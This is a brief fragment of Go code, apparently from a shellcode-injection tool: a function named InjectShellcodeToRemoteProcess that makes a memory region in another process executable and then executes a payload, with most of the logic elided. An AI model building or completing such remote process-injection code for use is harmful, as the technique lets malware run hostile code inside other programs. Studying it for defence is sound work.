...
func InjectShellcodeToRemoteProcess(hProcess HANDLE, pShellcode []byte, sSizeOfShellcode int) error {
	...
	if err != nil {
		return errors.New("[!] Failed to make memory region executable " + err.Error())
	}
	DebugWait("Run")
	Debugf("Executing Payload ... \n")
